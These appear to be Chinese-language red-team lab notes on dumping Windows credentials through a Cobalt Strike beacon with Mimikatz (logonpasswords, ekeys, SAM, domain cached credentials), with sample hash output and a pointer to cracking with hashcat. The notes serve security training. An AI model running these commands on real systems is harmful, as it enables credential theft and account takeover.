# Credentials & User Impersonation

net logons将显示当前登录到主机的所有用户

```
beacon> net logons
Logged on users at \\localhost:

DEV\SRV-1$
DEV\jking
DEV\svc_mssql
```

也可以通过ps命令查看登录过本机的用户（开启的进程）
```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking
2496  716   svchost.exe                  x64   1           DEV\jking
2948  1200  sihost.exe                   x64   1           DEV\jking
3088  1200  taskhostw.exe                x64   1           DEV\jking
3320  3304  explorer.exe                 x64   1           DEV\jking
3608  796   ShellExperienceHost.exe      x64   1           DEV\jking
3800  796   SearchUI.exe                 x64   1           DEV\jking
4004  3320  shutdown.exe                 x64   1           DEV\jking
4016  4004  conhost.exe                  x64   1           DEV\jking
4472  1200  taskhostw.exe                x64   1           DEV\jking
[...snip...]
2656  716   sqlservr.exe                 x64   0           DEV\svc_mssql
```

# LogonPasswords

导出内存中的密码，有可能出现明文密码，但是可能性比较小。需要本地管理员权限
```
beacon> mimikatz sekurlsa::logonpasswords
```

上面命令在Cobalt Strike里的缩写

```
logonpasswords
```

# eKeys

这个 Mimikatz 模块将转储 Kerberos 加密密钥。

这个Mimikatz模块将转储Kerberos加密密钥。由于大多数Windows服务选择使用Kerberos而不是NTLM，利用这些比NTLM的哈希值更有意义，可以混入正常的认证流量。

以下命令需要本地管理员权限

```
beacon> mimikatz sekurlsa::ekeys
```


# Security Account Manager

 (SAM) 数据库仅保存本地帐户的 NTLM 哈希

 下面命令需要本地管理员权限
 ```
 beacon> mimikatz lsadump::sam
 ```


# Domain Cached Credentials

域缓存凭据

Domain Cached Credentials 的设计初衷是计算机离线以后还可以继续登录机器，可以离线提取和破解这些凭据以获得明文密码

注意：这里的哈希格式不是ntlm

```
beacon> mimikatz lsadump::cache

Domain : SRV-1
SysKey : 5d11b46a92921b8775ca574306ba5355

Local name : SRV-1 ( S-1-5-21-4124990477-354564332-720757739 )
Domain name : DEV ( S-1-5-21-3263068140-2042698922-2891547269 )
Domain FQDN : dev.cyberbotic.io

Policy subsystem is : 1.14
LSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}
  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983

* Iteration is set to default (10240)

[NL$1 - 2/25/2021 1:07:37 PM]
RID       : 00000460 (1120)
User      : DEV\bfarmer
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 5/17/2021 2:00:46 PM]
RID       : 0000046e (1134)
User      : DEV\svc_mssql
MsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6

[NL$3 - 5/17/2021 2:00:50 PM]
RID       : 00000462 (1122)
User      : DEV\jking
MsCacheV2 : 673e2fe26e26e79c58379168b79890f6
```

可以使用hashcat破解上面的哈希，例子见[这里](https://hashcat.net/wiki/doku.php?id=example_hashes)


# Make Token